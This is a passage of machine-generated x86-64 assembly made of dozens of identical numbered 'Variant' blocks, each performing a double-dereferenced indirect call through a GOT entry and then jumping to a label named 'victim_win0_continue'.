	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 374
.Lvictim_win0_var374:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 375
.Lvictim_win0_var375:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 376
.Lvictim_win0_var376:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 377
.Lvictim_win0_var377:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 378
.Lvictim_win0_var378:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 379
.Lvictim_win0_var379:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 380
.Lvictim_win0_var380:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 381
.Lvictim_win0_var381:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 382
.Lvictim_win0_var382:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 383
.Lvictim_win0_var383:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 384
.Lvictim_win0_var384:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 385
.Lvictim_win0_var385:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 386
.Lvictim_win0_var386:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 387
.Lvictim_win0_var387:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 388
.Lvictim_win0_var388:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 389
.Lvictim_win0_var389:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 390
.Lvictim_win0_var390:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 391
.Lvictim_win0_var391:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 392
.Lvictim_win0_var392:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 393
.Lvictim_win0_var393:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 394
.Lvictim_win0_var394:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 395
.Lvictim_win0_var395:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 396
.Lvictim_win0_var396:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 397
.Lvictim_win0_var397:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 398
.Lvictim_win0_var398:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 399
.Lvictim_win0_var399:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 400
.Lvictim_win0_var400:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 401
.Lvictim_win0_var401:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 402
.Lvictim_win0_var402:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 403
.Lvictim_win0_var403:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 404
.Lvictim_win0_var404:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 405
.Lvictim_win0_var405:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 406
.Lvictim_win0_var406:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 407
.Lvictim_win0_var407:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 408
.Lvictim_win0_var408:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 409
.Lvictim_win0_var409:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 410
.Lvictim_win0_var410:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 411
.Lvictim_win0_var411:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 412
.Lvictim_win0_var412:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 413
.Lvictim_win0_var413:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 414
.Lvictim_win0_var414:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 415
.Lvictim_win0_var415:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 416
.Lvictim_win0_var416:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 417
.Lvictim_win0_var417:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 418
.Lvictim_win0_var418:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 419
.Lvictim_win0_var419:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 420
.Lvictim_win0_var420:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 421
.Lvictim_win0_var421:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 422
.Lvictim_win0_var422:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 423
.Lvictim_win0_var423:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 424
.Lvictim_win0_var424:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 425
.Lvictim_win0_var425:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 426
.Lvictim_win0_var426:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 427
.Lvictim_win0_var427:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 428
.Lvictim_win0_var428:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 429
.Lvictim_win0_var429:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 430
.Lvictim_win0_var430:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 431
.Lvictim_win0_var431:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 432
.Lvictim_win0_var432:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 433
.Lvictim_win0_var433:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 434
.Lvictim_win0_var434:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 435
.Lvictim_win0_var435:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 436
.Lvictim_win0_var436:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 437
.Lvictim_win0_var437:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 438
.Lvictim_win0_var438:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 439
.Lvictim_win0_var439:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 440
.Lvictim_win0_var440:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 441
.Lvictim_win0_var441:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 442
.Lvictim_win0_var442:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 443
.Lvictim_win0_var443:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 444
.Lvictim_win0_var444:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 445
.Lvictim_win0_var445:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 446
.Lvictim_win0_var446:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 447
.Lvictim_win0_var447:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 448
.Lvictim_win0_var448:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 449
.Lvictim_win0_var449:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 450
.Lvictim_win0_var450:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 451
.Lvictim_win0_var451:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 452
.Lvictim_win0_var452:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 453
.Lvictim_win0_var453:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 454
.Lvictim_win0_var454:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 455
.Lvictim_win0_var455:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 456
.Lvictim_win0_var456:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 457
.Lvictim_win0_var457:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 458
.Lvictim_win0_var458:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 459
.Lvictim_win0_var459:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 460
.Lvictim_win0_var460:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 461
.Lvictim_win0_var461:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 462
.Lvictim_win0_var462:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 463
.Lvictim_win0_var463:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 464
.Lvictim_win0_var464:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 465
.Lvictim_win0_var465:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 466
.Lvictim_win0_var466:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 467
.Lvictim_win0_var467:
	popq	%rax
	leaq	_target@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
